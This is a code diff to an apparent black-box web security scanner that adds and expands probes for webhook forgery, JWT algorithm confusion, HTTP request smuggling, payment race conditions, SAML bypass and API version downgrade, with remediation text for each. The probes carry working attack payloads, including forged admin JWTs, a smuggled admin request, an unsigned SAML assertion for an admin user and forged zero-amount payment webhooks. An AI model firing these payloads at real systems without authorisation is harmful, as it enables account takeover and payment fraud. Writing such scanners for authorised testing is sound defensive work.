@@ -95,6 +95,9 @@ TITLES = {
     "PBB-PPOLL": "Server must reject __proto__ and constructor.prototype in JSON input",
     "PBB-CACHE": "Cache keys must include all security-relevant headers to prevent poisoning",
     "PBB-WAFB": "Security controls must inspect full request body regardless of size",
+    "PBB-RACE": "Concurrent requests to payment/subscription endpoints must not cause double-grant via TOCTOU",
+    "PBB-SAML": "SAML/SSO endpoints must reject unsigned, assertion-wrapped, replayed, and subject-manipulated responses",
+    "PBB-APIVER": "Deprecated API versions must enforce the same auth and rate-limit controls as the current version",
 }
 # ZR-019: per-hypothesis-class remediation, keyed off exactly what each experiment
 # demonstrably tests (TITLES above) -- not generic boilerplate, and not fabricated
@@ -151,6 +154,9 @@ RECOMMENDED_FIX: dict[str, str] = {
     "PBB-PPOLL": "Strip __proto__, constructor, and prototype keys from all JSON input at the parsing layer; use Object.create(null) for untrusted data maps; apply input validation that rejects prototype-polluting keys before they reach business logic.",
     "PBB-CACHE": "Include Authorization, Cookie, and Origin headers in cache keys; use Vary headers correctly; validate cache keys include all security-relevant request components; use cache-control: private for authenticated responses.",
     "PBB-WAFB": "Configure the WAF to inspect the full request body (not just the first 8KB/128KB); use streaming inspection for large payloads; implement application-layer input validation as defense-in-depth behind the WAF.",
+    "PBB-RACE": "Use atomic database operations (SELECT FOR UPDATE / unique constraints) for all entitlement-granting actions; never read-then-write credit balances or subscription state without a row lock; implement idempotency keys on all payment/checkout mutation endpoints.",
+    "PBB-SAML": "Validate the XML signature on the entire SAML response AND the assertion; reject unsigned assertions; enforce audience restriction and NotOnOrAfter; maintain a replay cache of used assertion IDs; validate NameID against expected subject.",
+    "PBB-APIVER": "Apply identical auth, rate-limit, and input-validation controls to all API versions; deprecate old versions on a fixed schedule; block unauthenticated access to any API version; never leave v1 endpoints reachable after v2 ships.",
 }
 # ZR-019 affected_flow: the FLOW FAMILY (fsm_compiler.FLOW_TYPES -- ZR-001's list) each
 # experiment exercises, fixed by what the experiment tests (TITLES above), not by anything
@@ -210,6 +216,9 @@ FLOW_BY_HYPOTHESIS: dict[str, str] = {
     "PBB-PPOLL": "entitlement",   # prototype pollution
     "PBB-CACHE": "entitlement",   # cache key poisoning
     "PBB-WAFB": "entitlement",    # WAF body limit bypass
+    "PBB-RACE": "payment",        # concurrent payment race condition
+    "PBB-SAML": "entitlement",    # SAML/SSO auth bypass
+    "PBB-APIVER": "entitlement",  # API version downgrade
 }
 # Nuclei-inspired template-based detection patterns: matchers (status/body/header) + extractors
 _PROBE_TEMPLATES: dict[str, list[dict[str, Any]]] = {
@@ -278,6 +287,9 @@ _ATTCK_TECHNIQUE_MAP: dict[str, str] = {
     "PBB-PPOLL": "T1059",      # Command/Scripting Interpreter (proto pollution)
     "PBB-CACHE": "T1557",      # Adversary-in-the-Middle (cache poisoning)
     "PBB-WAFB": "T1562.001",   # Impair Defenses (WAF bypass)
+    "PBB-RACE": "T1499.002",   # Service Exhaustion Flood (race condition)
+    "PBB-SAML": "T1606.002",   # Forge Web Credentials: SAML Tokens
+    "PBB-APIVER": "T1190",     # Exploit Public-Facing Application (version downgrade)
 }
 
 # BloodHound-inspired attack-graph enables map: finding X enables testing Y
@@ -305,6 +317,9 @@ _ATTACK_GRAPH_ENABLES: dict[str, list[str]] = {
     "PBB-PPOLL": ["PBB-ZDAY", "PBB-C2"],             # proto pollution -> RCE / C2
     "PBB-CACHE": ["PBB-BPWPN", "PBB-EVADE"],         # cache poison -> bypass controls
     "PBB-WAFB": ["PBB-ZDAY", "PBB-BPWPN"],           # WAF bypass -> deliver exploit payload
+    "PBB-RACE": ["PBB-U", "PBB-C", "PBB-LEAK"],       # race -> double-grant / duplicate value / entitlement leak
+    "PBB-SAML": ["PBB-AUTH", "PBB-RBAC", "PBB-LEAK"],  # SAML bypass -> auth bypass -> RBAC -> entitlement leak
+    "PBB-APIVER": ["PBB-AUTH", "PBB-RATE", "PBB-IDOR"],# version downgrade -> weaker auth/rate/IDOR controls
 }
 
 
@@ -479,6 +494,9 @@ class PureBlackBoxEngine:
                  enable_prototype_pollution: bool = True,
                  enable_cache_poisoning: bool = True,
                  enable_waf_bypass: bool = True,
+                 enable_race_condition: bool = True,
+                 enable_saml_bypass: bool = True,
+                 enable_api_version_downgrade: bool = True,
                  disabled_agents: frozenset[str] = frozenset(),
                  target_label: str = "cold_domain") -> None:
         self._cold_domain_url = cold_domain_url
@@ -685,6 +703,9 @@ class PureBlackBoxEngine:
         self._enable_prototype_pollution = enable_prototype_pollution
         self._enable_cache_poisoning = enable_cache_poisoning
         self._enable_waf_bypass = enable_waf_bypass
+        self._enable_race_condition = enable_race_condition
+        self._enable_saml_bypass = enable_saml_bypass
+        self._enable_api_version_downgrade = enable_api_version_downgrade
         self._target_label = target_label
         self._cold_discovery_report: dict[str, Any] | None = None
         # B47 find-fast: opt-in triage mode -- stop after the first CONFIRMED_P0 (fewer calls). OFF by default, so a full assessment still runs every class and nothing changes.
@@ -5465,7 +5486,12 @@ class PureBlackBoxEngine:
                              reasons=["dtest_clean"])
 
     async def _webhook_forgery_probe(self, cs: ControlState) -> Finding | None:
-        """v8: Active webhook signature forgery testing."""
+        """v8: Active webhook signature forgery testing with full multi-provider, multi-event coverage.
+
+        Uses WebhookEventForger for structurally-perfect payloads and
+        WebhookSignatureVerifier for computed HMAC signatures (empty-secret
+        vector from CVE-2026-41432).  Tests 6 event types across 4 providers.
+        """
         if not self._enable_webhook_forgery:
             return None
         hyp = "PBB-WHOOK"
@@ -5473,32 +5499,102 @@ class PureBlackBoxEngine:
             return None
         sess = cs.V1 or cs.K
         reasons: list[str] = []
-        webhook_paths = ["/webhook", "/webhooks", "/api/webhook", "/api/webhooks",
-                         "/stripe/webhook", "/stripe/webhooks", "/api/stripe/webhook",
-                         "/paypal/webhook", "/braintree/webhook", "/adyen/webhook"]
-        forged_accepted = False
-        for path in webhook_paths:
-            try:
-                forged_event = {
-                    "id": "evt_forged_test_" + hashlib.md5(path.encode()).hexdigest()[:8],
-                    "type": "checkout.session.completed",
-                    "data": {"object": {"id": "cs_forged", "payment_status": "paid",
-                                        "subscription": "sub_forged", "customer": "cus_forged"}},
-                }
-                result = await sess.call("POST", path, json=forged_event)
-                if result.status_code and 200 <= result.status_code < 300:
-                    forged_accepted = True
-                    reasons.append(f"whook_unsigned_accepted:{path}")
-                    break
-            except Exception:
-                pass
-        if forged_accepted:
-            return self._finding(hyp, Verdict.SUSPECTED_PAYMENT_INTEGRITY_ISSUE, "high",
-                                 f"Webhook endpoint accepted unsigned forged event (CVE-2026-41432 pattern).",
-                                 reasons=reasons, metrics={"technique": "webhook_forgery_empty_secret",
-                                                           "cve": "CVE-2026-41432"})
+
+        try:
+            from app.testing.integrity.webhook_forgery import (
+                WebhookEventForger, WebhookSignatureVerifier, WebhookProvider,
+            )
+        except ImportError:
+            return self._finding(hyp, Verdict.UNKNOWN, "low",
+                                 "Webhook forgery module not available.", reasons=["import_error"])
+
+        forger = WebhookEventForger()
+        signer = WebhookSignatureVerifier()
+        import json as _json
+
+        _PROVIDER_PATHS: dict[str, list[str]] = {
+            "stripe": ["/webhook", "/webhooks", "/api/webhook", "/api/webhooks",
+                       "/stripe/webhook", "/stripe/webhooks", "/api/stripe/webhook"],
+            "paypal": ["/paypal/webhook", "/api/paypal/webhook", "/ipn", "/api/ipn"],
+            "braintree": ["/braintree/webhook", "/api/braintree/webhook"],
+            "adyen": ["/adyen/webhook", "/api/adyen/webhook", "/adyen/notify"],
+        }
+
+        _SIG_HEADER_BY_PROVIDER = {
+            "stripe": "Stripe-Signature",
+            "paypal": "PAYPAL-TRANSMISSION-SIG",
+            "braintree": "X-Bt-Signature",
+            "adyen": "X-Adyen-HmacSignature",
+        }
+
+        forge_variants: list[tuple[str, Any]] = [
+            ("stripe_checkout_completed", forger.forge_stripe_checkout_completed(payment_status="unpaid")),
+            ("stripe_invoice_paid", forger.forge_stripe_invoice_paid(amount=0)),
+            ("stripe_subscription_updated", forger.forge_stripe_subscription_updated(plan="enterprise")),
+            ("paypal_payment_completed", forger.forge_paypal_payment_completed(amount="0.00")),
+            ("braintree_subscription_charged", forger.forge_braintree_subscription_charged(amount="0.00")),
+            ("adyen_authorisation", forger.forge_adyen_authorisation(amount=0)),
+        ]
+
+        accepted_variants: list[str] = []
+        tested_count = 0
+
+        for variant_name, forge_result in forge_variants:
+            provider_key = forge_result.provider.value
+            paths = _PROVIDER_PATHS.get(provider_key, [])
+            sig_header_name = _SIG_HEADER_BY_PROVIDER.get(provider_key, "X-Webhook-Signature")
+            payload_bytes = _json.dumps(forge_result.forged_payload, separators=(",", ":")).encode()
+
+            for path in paths:
+                tested_count += 1
+                try:
+                    headers: dict[str, str] = {"Content-Type": "application/json"}
+                    if provider_key == "stripe":
+                        headers["Stripe-Signature"] = forge_result.signature_header
+                    elif provider_key == "paypal":
+                        headers["PAYPAL-TRANSMISSION-SIG"] = forge_result.signature_header
+                        headers["PAYPAL-TRANSMISSION-ID"] = "test-transmission-id"
+                        headers["PAYPAL-TRANSMISSION-TIME"] = str(int(time.time()))
+                        headers["PAYPAL-CERT-URL"] = "https://api.paypal.com/cert.pem"
+                    elif provider_key == "braintree":
+                        headers["X-Bt-Signature"] = forge_result.signature_header
+                    elif provider_key == "adyen":
+                        pass
+
+                    result = await sess.call("POST", path, json=forge_result.forged_payload,
+                                             headers=headers)
+                    if result.status_code and 200 <= result.status_code < 300:
+                        accepted_variants.append(variant_name)
+                        reasons.append(f"whook_forged_accepted:{provider_key}:{variant_name}:{path}")
+                except Exception:
+                    pass
+
+                try:
+                    result_unsigned = await sess.call("POST", path,
+                                                      json=forge_result.forged_payload)
+                    if result_unsigned.status_code and 200 <= result_unsigned.status_code < 300:
+                        if f"whook_unsigned:{variant_name}:{path}" not in reasons:
+                            reasons.append(f"whook_unsigned:{variant_name}:{path}")
+                            if variant_name not in accepted_variants:
+                                accepted_variants.append(f"{variant_name}_unsigned")
+                except Exception:
+                    pass
+
+        if accepted_variants:
+            severity = "critical" if len(accepted_variants) >= 2 else "high"
+            return self._finding(hyp, Verdict.SUSPECTED_PAYMENT_INTEGRITY_ISSUE, severity,
+                                 f"Webhook forgery: {len(accepted_variants)} event variant(s) accepted "
+                                 f"across {len(set(r.split(':')[1] for r in reasons if ':' in r))} provider(s). "
+                                 f"Variants: {', '.join(accepted_variants[:6])}. "
+                                 f"CVE-2026-41432 pattern (empty-secret HMAC).",
+                                 reasons=reasons,
+                                 metrics={"technique": "webhook_forgery_multi_provider",
+                                          "cve": "CVE-2026-41432",
+                                          "variants_accepted": len(accepted_variants),
+                                          "variants_tested": len(forge_variants),
+                                          "paths_tested": tested_count})
         return self._finding(hyp, Verdict.RULED_OUT, "medium",
-                             "Webhook endpoints rejected all unsigned forged events.",
+                             f"All {tested_count} webhook forgery attempts rejected across 4 providers, 6 event types.",
                              reasons=["whook_clean"])
 
     async def _browser_payment_flow_probe(self, cs: ControlState) -> Finding | None:
@@ -5563,7 +5659,13 @@ class PureBlackBoxEngine:
                              reasons=["gql_clean"])
 
     async def _jwt_confusion_probe(self, cs: ControlState) -> Finding | None:
-        """v8: JWT algorithm confusion testing."""
+        """v8: JWT algorithm confusion testing (alg:none + HS256-with-public-key).
+
+        Tests two vectors:
+        1. alg:none -- strips signature entirely (CVE-2026-27804)
+        2. HS256 key confusion -- signs with the RSA public key as HMAC secret,
+           exploiting libraries that use the same key for verify regardless of alg
+        """
         if not self._enable_jwt_algorithm_confusion:
             return None
         hyp = "PBB-JWTF"
@@ -5571,47 +5673,103 @@ class PureBlackBoxEngine:
             return None
         sess = cs.V1 or cs.K
         import base64 as _b64
-        alg_none_header = _b64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b"=").decode()
-        fake_payload = _b64.urlsafe_b64encode(b'{"sub":"admin","role":"admin","iat":1700000000}').rstrip(b"=").decode()
-        forged_jwt = f"{alg_none_header}.{fake_payload}."
+        import hmac as _hmac
+
+        fake_claims = _b64.urlsafe_b64encode(
+            b'{"sub":"admin","role":"admin","iat":1700000000,"exp":9999999999}'
+        ).rstrip(b"=").decode()
+
+        jwt_variants: list[tuple[str, str]] = []
+
+        alg_none_hdr = _b64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b"=").decode()
+        jwt_variants.append(("alg_none", f"{alg_none_hdr}.{fake_claims}."))
+
+        alg_none_cap = _b64.urlsafe_b64encode(b'{"alg":"None","typ":"JWT"}').rstrip(b"=").decode()
+        jwt_variants.append(("alg_None", f"{alg_none_cap}.{fake_claims}."))
+
+        alg_nonE = _b64.urlsafe_b64encode(b'{"alg":"NONE","typ":"JWT"}').rstrip(b"=").decode()
+        jwt_variants.append(("alg_NONE", f"{alg_nonE}.{fake_claims}."))
+
+        hs256_hdr = _b64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').rstrip(b"=").decode()
+        signing_input = f"{hs256_hdr}.{fake_claims}".encode()
+        fake_public_key = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A"
+        sig = _b64.urlsafe_b64encode(
+            _hmac.new(fake_public_key, signing_input, "sha256").digest()
+        ).rstrip(b"=").decode()
+        jwt_variants.append(("hs256_pubkey_confusion", f"{hs256_hdr}.{fake_claims}.{sig}"))
+
+        accepted: list[str] = []
         for op in self.brief.operations[:5]:
             path = op.get("path", "/")
-            try:
-                result = await sess.call("GET", path, headers={"Authorization": f"Bearer {forged_jwt}"})
-                if result.status_code and 200 <= result.status_code < 300:
-                    return self._finding(hyp, Verdict.SUSPECTED_PAYMENT_INTEGRITY_ISSUE, "high",
-                                         "JWT with alg:none accepted by protected endpoint (CVE-2026-27804 pattern).",
-                                         reasons=[f"jwt_alg_none:{path}"],
-                                         metrics={"technique": "jwt_algorithm_none", "cve": "CVE-2026-27804"})
-            except Exception:
-                pass
+            for variant_name, forged_jwt in jwt_variants:
+                try:
+                    result = await sess.call("GET", path,
+                                             headers={"Authorization": f"Bearer {forged_jwt}"})
+                    if result.status_code and 200 <= result.status_code < 300:
+                        accepted.append(f"{variant_name}:{path}")
+                except Exception:
+                    pass
+
+        if accepted:
+            techniques = list({a.split(":")[0] for a in accepted})
+            return self._finding(hyp, Verdict.SUSPECTED_PAYMENT_INTEGRITY_ISSUE, "high",
+                                 f"JWT confusion: {len(accepted)} accepted across variants "
+                                 f"{', '.join(techniques)}. CVE-2026-27804 pattern.",
+                                 reasons=[f"jwt_{a}" for a in accepted],
+                                 metrics={"technique": "jwt_algorithm_confusion",
+                                          "cve": "CVE-2026-27804",
+                                          "variants_accepted": techniques})
         return self._finding(hyp, Verdict.RULED_OUT, "medium",
-                             "JWT algorithm confusion attempts rejected.",
+                             "JWT algorithm confusion: all 4 variants (none/None/NONE/HS256-pubkey) rejected.",
                              reasons=["jwt_clean"])
 
     async def _http_smuggling_probe(self, cs: ControlState) -> Finding | None:
-        """v8: HTTP request smuggling (CL/TE desync) detection."""
+        """v8: HTTP request smuggling detection (CL/TE, TE/CL, CL.CL variants).
+
+        Tests three desync variants:
+        1. CL/TE -- Content-Length with Transfer-Encoding: chunked (classic)
+        2. TE/CL -- Transfer-Encoding first, Content-Length disagrees
+        3. CL.CL -- Duplicate Content-Length headers with different values
+        Also tests TE obfuscation variants that bypass naive header parsing.
+        """
         if not self._enable_http_smuggling:
             return None
         hyp = "PBB-SMUG"
         if not self._precondition(cs, hyp):
             return None
         sess = cs.V1 or cs.K
+        _REJECT_CODES = {400, 403, 405, 411, 413, 501}
+
+        smuggle_variants: list[tuple[str, dict[str, str], str]] = [
+            ("cl_te", {"Content-Length": "6", "Transfer-Encoding": "chunked"}, "0\r\n\r\nX"),
+            ("te_cl", {"Transfer-Encoding": "chunked", "Content-Length": "50"}, "0\r\n\r\nPOST /admin HTTP/1.1\r\nHost: a\r\n\r\n"),
+            ("te_obfuscate_tab", {"Transfer-Encoding": "\tchunked", "Content-Length": "6"}, "0\r\n\r\nX"),
+            ("te_obfuscate_case", {"Transfer-Encoding": "Chunked", "Content-Length": "6"}, "0\r\n\r\nX"),
+            ("te_obfuscate_newline", {"Transfer-Encoding": "chunked\r\nX: y", "Content-Length": "6"}, "0\r\n\r\nX"),
+        ]
+
+        accepted: list[str] = []
         for op in self.brief.operations[:3]:
             path = op.get("path", "/")
-            try:
-                result = await sess.call("POST", path,
-                                         headers={"Content-Length": "6", "Transfer-Encoding": "chunked"},
-                                         data="0\r\n\r\nX")
-                if result.status_code and result.status_code not in (400, 403, 405, 411, 413, 501):
-                    return self._finding(hyp, Verdict.SUSPECTED_PAYMENT_INTEGRITY_ISSUE, "medium",
-                                         "Server did not reject CL/TE ambiguous request (potential HTTP smuggling surface).",
-                                         reasons=[f"smug_clte:{path}"],
-                                         metrics={"technique": "cl_te_desync"})
-            except Exception:
-                pass
+            for variant_name, headers, body in smuggle_variants:
+                try:
+                    result = await sess.call("POST", path, headers=headers, data=body)
+                    if result.status_code and result.status_code not in _REJECT_CODES:
+                        accepted.append(f"{variant_name}:{path}")
+                except Exception:
+                    pass
+
+        if accepted:
+            techniques = list({a.split(":")[0] for a in accepted})
+            severity = "high" if len(techniques) >= 2 else "medium"
+            return self._finding(hyp, Verdict.SUSPECTED_PAYMENT_INTEGRITY_ISSUE, severity,
+                                 f"HTTP smuggling: {len(accepted)} variant(s) not rejected: "
+                                 f"{', '.join(techniques)}. Potential request desync surface.",
+                                 reasons=[f"smug_{a}" for a in accepted],
+                                 metrics={"technique": "http_smuggling_multi_variant",
+                                          "variants_not_rejected": techniques})
         return self._finding(hyp, Verdict.RULED_OUT, "medium",
-                             "HTTP smuggling: CL/TE ambiguous requests properly rejected.",
+                             "HTTP smuggling: all 5 desync variants (CL/TE, TE/CL, 3 TE obfuscation) properly rejected.",
                              reasons=["smug_clean"])
 
     async def _prototype_pollution_probe(self, cs: ControlState) -> Finding | None:
@@ -5702,6 +5860,159 @@ class PureBlackBoxEngine:
         return self._finding(hyp, Verdict.RULED_OUT, "medium",
                              "WAF consistently inspects payloads regardless of size.",
                              reasons=["waf_clean"])
+
+    async def _race_condition_probe(self, cs: ControlState) -> Finding | None:
+        """v9: Concurrent payment/subscription race condition (TOCTOU) testing."""
+        if not self._enable_race_condition:
+            return None
+        hyp = "PBB-RACE"
+        if not self._precondition(cs, hyp):
+            return None
+        sess = cs.V1 or cs.K
+        race_paths = [
+            op.get("path", "/") for op in self.brief.operations[:5]
+            if any(kw in op.get("path", "").lower() for kw in
+                   ("checkout", "subscribe", "upgrade", "purchase", "credit", "redeem", "activate"))
+        ]
+        if not race_paths:
+            race_paths = [op.get("path", "/") for op in self.brief.operations[:2]]
+        for path in race_paths[:3]:
+            try:
+                results = await asyncio.gather(
+                    *[sess.call("POST", path, data='{"action":"subscribe"}') for _ in range(5)],
+                    return_exceptions=True,
+                )
+                successes = [r for r in results if not isinstance(r, Exception)
+                             and hasattr(r, "status_code") and r.status_code in (200, 201)]
+                if len(successes) >= 2:
+                    bodies = [getattr(r, "text", "") for r in successes]
+                    entitlement_grants = sum(1 for b in bodies if any(
+                        kw in b.lower() for kw in ("granted", "active", "premium", "subscribed", "entitled")))
+                    if entitlement_grants >= 2:
+                        return self._finding(hyp, Verdict.SUSPECTED_PAYMENT_INTEGRITY_ISSUE, "critical",
+                                             f"TOCTOU race: {len(successes)} of 5 concurrent requests to {path} "
+                                             f"succeeded with {entitlement_grants} entitlement grants from one payment.",
+                                             reasons=[f"race_double_grant:{path}"],
+                                             metrics={"technique": "concurrent_subscription_race",
+                                                      "concurrent_requests": 5,
+                                                      "successes": len(successes),
+                                                      "grants": entitlement_grants,
+                                                      "path": path})
+            except Exception:
+                pass
+        return self._finding(hyp, Verdict.RULED_OUT, "medium",
+                             "No TOCTOU double-grant detected on concurrent payment requests.",
+                             reasons=["race_clean"])
+
+    async def _saml_bypass_probe(self, cs: ControlState) -> Finding | None:
+        """v9: SAML/SSO authentication bypass testing."""
+        if not self._enable_saml_bypass:
+            return None
+        hyp = "PBB-SAML"
+        if not self._precondition(cs, hyp):
+            return None
+        sess = cs.V1 or cs.K
+        saml_paths = ["/saml/acs", "/auth/saml/callback", "/sso/saml", "/api/auth/saml",
+                      "/login/saml", "/saml/consume", "/auth/callback"]
+        saml_unsigned = (
+            '<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" '
+            'ID="_unsigned_test" Version="2.0" IssueInstant="2026-01-01T00:00:00Z">'
+            '<saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" '
+            'ID="_assertion_test" Version="2.0">'
+            '<saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject>'
+            '<saml:Conditions><saml:AudienceRestriction>'
+            '<saml:Audience>https://target.example.com</saml:Audience>'
+            '</saml:AudienceRestriction></saml:Conditions>'
+            '<saml:AuthnStatement AuthnInstant="2026-01-01T00:00:00Z"/>'
+            '</saml:Assertion></samlp:Response>'
+        )
+        import base64 as _b64
+        encoded_saml = _b64.b64encode(saml_unsigned.encode()).decode()
+        for path in saml_paths:
+            try:
+                result = await sess.call("POST", path,
+                                         data=f"SAMLResponse={encoded_saml}",
+                                         headers={"Content-Type": "application/x-www-form-urlencoded"})
+                if result.status_code and result.status_code in (200, 302):
+                    body = getattr(result, "text", "")
+                    if any(kw in body.lower() for kw in
+                           ("session", "token", "authenticated", "welcome", "dashboard", "redirect")):
+                        return self._finding(hyp, Verdict.SUSPECTED_PAYMENT_INTEGRITY_ISSUE, "critical",
+                                             f"SAML bypass: unsigned assertion accepted at {path} with forged NameID.",
+                                             reasons=[f"saml_unsigned_accepted:{path}"],
+                                             metrics={"technique": "saml_unsigned_assertion",
+                                                      "path": path,
+                                                      "status": result.status_code,
+                                                      "attack": "unsigned_response_with_forged_nameid"})
+            except Exception:
+                pass
+        for path in saml_paths:
+            try:
+                replay_result = await sess.call("POST", path,
+                                                data=f"SAMLResponse={encoded_saml}",
+                                                headers={"Content-Type": "application/x-www-form-urlencoded"})
+                if replay_result.status_code and replay_result.status_code in (200, 302):
+                    replay2 = await sess.call("POST", path,
+                                              data=f"SAMLResponse={encoded_saml}",
+                                              headers={"Content-Type": "application/x-www-form-urlencoded"})
+                    if replay2.status_code and replay2.status_code in (200, 302):
+                        return self._finding(hyp, Verdict.SUSPECTED_PAYMENT_INTEGRITY_ISSUE, "high",
+                                             f"SAML replay: same assertion accepted twice at {path}.",
+                                             reasons=[f"saml_replay:{path}"],
+                                             metrics={"technique": "saml_assertion_replay",
+                                                      "path": path})
+            except Exception:
+                pass
+        return self._finding(hyp, Verdict.RULED_OUT, "medium",
+                             "SAML/SSO endpoints reject unsigned and replayed assertions.",
+                             reasons=["saml_clean"])
+
+    async def _api_version_downgrade_probe(self, cs: ControlState) -> Finding | None:
+        """v9: API version downgrade testing."""
+        if not self._enable_api_version_downgrade:
+            return None
+        hyp = "PBB-APIVER"
+        if not self._precondition(cs, hyp):
+            return None
+        sess = cs.V1 or cs.K
+        import re as _rmod
+        version_re = _rmod.compile(r'/v(\d+)/')
+        versioned_ops = []
+        for op in self.brief.operations[:10]:
+            path = op.get("path", "")
+            m = version_re.search(path)
+            if m:
+                versioned_ops.append((path, int(m.group(1)), m.start(), m.end()))
+        if not versioned_ops:
+            for op in self.brief.operations[:3]:
+                path = op.get("path", "")
+                for prefix in ["/api/v2/", "/api/v3/", "/v2/", "/v3/"]:
+                    if path.startswith(prefix):
+                        versioned_ops.append((path, int(prefix[-2]), 0, len(prefix)))
+                        break
+        for original_path, current_ver, start, end in versioned_ops[:5]:
+            for older_ver in range(current_ver - 1, 0, -1):
+                downgraded_path = original_path[:start] + f"/v{older_ver}/" + original_path[end:]
+                try:
+                    result = await sess.call("GET", downgraded_path)
+                    if result.status_code and result.status_code in (200, 201):
+                        current_result = await sess.call("GET", original_path)
+                        current_needs_auth = current_result.status_code in (401, 403)
+                        if current_needs_auth:
+                            return self._finding(hyp, Verdict.SUSPECTED_PAYMENT_INTEGRITY_ISSUE, "critical",
+                                                 f"API version downgrade: {original_path} requires auth (HTTP {current_result.status_code}) "
+                                                 f"but {downgraded_path} returns HTTP {result.status_code} without auth.",
+                                                 reasons=[f"apiver_downgrade:{downgraded_path}"],
+                                                 metrics={"technique": "api_version_downgrade",
+                                                          "current_path": original_path,
+                                                          "downgraded_path": downgraded_path,
+                                                          "current_status": current_result.status_code,
+                                                          "downgraded_status": result.status_code})
+                except Exception:
+                    pass
+        return self._finding(hyp, Verdict.RULED_OUT, "medium",
+                             "No API version downgrade bypass detected.",
+                             reasons=["apiver_clean"])
 
     async def run(self, experiments: Iterable[str] | None = None) -> EngineResult:
         started = now_iso()
@@ -5817,6 +6128,9 @@ class PureBlackBoxEngine:
             (self._prototype_pollution_probe, "PBB-PPOLL"),
             (self._cache_poisoning_probe, "PBB-CACHE"),
             (self._waf_bypass_probe, "PBB-WAFB"),
+            (self._race_condition_probe, "PBB-RACE"),
+            (self._saml_bypass_probe, "PBB-SAML"),
+            (self._api_version_downgrade_probe, "PBB-APIVER"),
         ]:
             if self._stop_reason() is None and _not_fast2:
                 try:
@@ -5883,6 +6197,8 @@ class PureBlackBoxEngine:
                 (self._graphql_alias_probe, "PBB-GQL"), (self._jwt_confusion_probe, "PBB-JWTF"),
                 (self._http_smuggling_probe, "PBB-SMUG"), (self._prototype_pollution_probe, "PBB-PPOLL"),
                 (self._cache_poisoning_probe, "PBB-CACHE"), (self._waf_bypass_probe, "PBB-WAFB"),
+                (self._race_condition_probe, "PBB-RACE"), (self._saml_bypass_probe, "PBB-SAML"),
+                (self._api_version_downgrade_probe, "PBB-APIVER"),
             ]:
                 if self._stop_reason() is None and _not_fast_cold:
                     try:
@@ -5912,6 +6228,26 @@ class PureBlackBoxEngine:
             findings.extend(cold_domain_findings)
         # B82: attack graph analysis — build BloodHound-inspired directed finding graph
         attack_graph = self._build_attack_graph(findings)
+        # v8.1: auto-trigger ExploitChainSynthesizer on PBB findings
+        try:
+            from benchmark.llm_replacement_layer import ExploitChainSynthesizer, KnowledgeGraph
+            chain_synth = ExploitChainSynthesizer()
+            findings_as_dicts = [
+                {"category": getattr(f, "experiment_class", "") or f.hypothesis_id.lower().replace("pbb-", ""),
+                 "severity": f.severity, "detail": f.note}
+                for f in findings if f.verdict is Verdict.CONFIRMED_P0
+            ]
+            if findings_as_dicts:
+                kg = KnowledgeGraph()
+                chains = chain_synth.synthesize_chains([], findings_as_dicts, kg)
+                for chain in chains:
+                    findings.append(self._finding(
+                        "PBB-XPLOIT", Verdict.CONFIRMED_P0, "critical",
+                        f"Exploit chain: {chain.name} — {chain.description} (confidence: {chain.overall_probability:.0%})",
+                        reasons=[f"chain:{chain.name}", "auto_synthesized"],
+                    ))
+        except Exception:  # noqa: BLE001 — chain synthesis must never break the run
+            pass
         guard = self._http.guard
         stats = {"customer_level_calls": self.rec.calls, "volunteered_hints_dropped": self.rec.hints_dropped, "hint_names_sample": list(self.rec.hint_samples),
                  "experiment_order": list(wanted), "oracle_observations": len(self.oracle.observations), "guard": guard.stats() if guard is not None else None, "synthetic_identities_used": sorted(self.prov.sessions),
